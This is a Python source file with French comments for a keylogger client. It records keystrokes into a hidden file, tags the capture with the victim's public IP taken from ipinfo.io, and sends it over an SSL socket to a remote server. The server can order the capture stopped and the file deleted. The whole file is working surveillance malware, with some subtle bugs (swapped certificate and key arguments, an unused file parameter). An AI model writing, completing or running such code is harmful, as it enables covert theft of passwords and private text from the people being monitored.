import keylogger
import socket
import ssl
import requests
import time  
import os  
from datetime import datetime

def generate_keys():
    # Générer une paire de clés pour le client
    os.system("openssl req -nodes -newkey rsa:2048 -keyout client_private_key.pem -out client_csr.pem")
    os.system("openssl x509 -req -sha256 -days 365 -in client_csr.pem -signkey client_private_key.pem -out client_public_key.pem")

# Générer les clés pour le client
generate_keys()

# Chemins des clés du client
PRIVATE_KEY = "client_private_key.pem"
PUBLIC_KEY = "client_public_key.pem"

# Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
def get_filename():
    now = datetime.now()
    response = requests.get("https://ipinfo.io")
    ip_data = response.json()
    public_ip = ip_data.get('ip')
    filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
    return filename

# Fonction pour lancer le keylogger
def launch_keylogger():
    keylogger.listen_keyboard()

# Fonction pour arrêter le keylogger
def stop_keylogger():
    # Arrêter le keylogger
    keylogger.stop_keylogger()

# Fonction pour arrêter le keylogger et supprimer le fichier de capture
def stop_and_delete_capture_file():
    # Arrêter le keylogger
    stop_keylogger()

    # Supprimer le fichier de capture
    try:
        file_path = ".document1.txt"  # Assurez-vous que c'est le bon chemin
        os.remove(file_path)
        print(f"Fichier {file_path} supprimé avec succès.")
    except Exception as e:
        print(f"Erreur lors de la suppression du fichier : {e}")

# Fonction pour envoyer le fichier de manière sécurisée au serveur via une socket SSL
def send_file_securely(file_path, server_address, server_port):
    # Créer une socket TCP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Créer un contexte SSL
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=PRIVATE_KEY, keyfile=PUBLIC_KEY)

    # Établir une connexion sécurisée avec le serveur
    secure_socket = context.wrap_socket(client_socket, server_hostname=server_address)

    try:
        # Se connecter au serveur
        secure_socket.connect((server_address, server_port))

        # Envoyer le nom du fichier au serveur
        filename = get_filename()
        secure_socket.send(filename.encode())

        # Envoyer le contenu du fichier au serveur
        with open(".document1.txt", "r") as file:
            file_data = file.read()
            secure_socket.sendall(file_data.encode())

        # Recevoir l'ordre du serveur
        order = secure_socket.recv(1024).decode()

        # Si l'ordre est d'arrêter et supprimer le fichier
        if order == "STOP_AND_DELETE":
            stop_and_delete_capture_file()

        print("Fichier envoyé avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")
    finally:
        # Fermer la connexion
        secure_socket.close()

if __name__ == "__main__":
    # Fichier à envoyer
    file_to_send = "chemin_du_fichier.txt"

    # Adresse du serveur
    server_address = "adresse_du_serveur"

    # Port du serveur
    server_port = 12345

    # Envoyer le fichier de manière sécurisée au serveur
    send_file_securely(file_to_send, server_address, server_port)
